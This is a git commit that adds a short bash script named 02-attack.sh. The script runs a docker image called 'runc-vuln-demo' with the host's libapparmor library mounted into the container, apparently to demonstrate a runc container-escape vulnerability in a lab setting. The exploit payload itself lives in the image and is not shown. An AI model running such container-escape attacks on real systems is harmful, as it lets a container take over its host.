159c603fe59022e7fc60d72bae2fd9e9b116f7b7
dstubked <45514912+dstubked@users.noreply.github.com>
2019-07-15 15:41:18 +0800

    Create 02-attack.sh

---
+++ runc/02-attack.sh
@@ -0,0 +1,4 @@
+#!/bin/bash
+echo "docker run --rm -it -v /lib/x86_64-linux-gnu/libapparmor.so.1:/lib/x86_64-linux-gnu/libapparmor.so.1 yanivagman/runc-vuln-demo"
+docker run --rm -it -v /lib/x86_64-linux-gnu/libapparmor.so.1:/lib/x86_64-linux-gnu/libapparmor.so.1 yanivagman/runc-vuln-demo
+#docker run --rm -it yanivagman/runc-vuln-demo
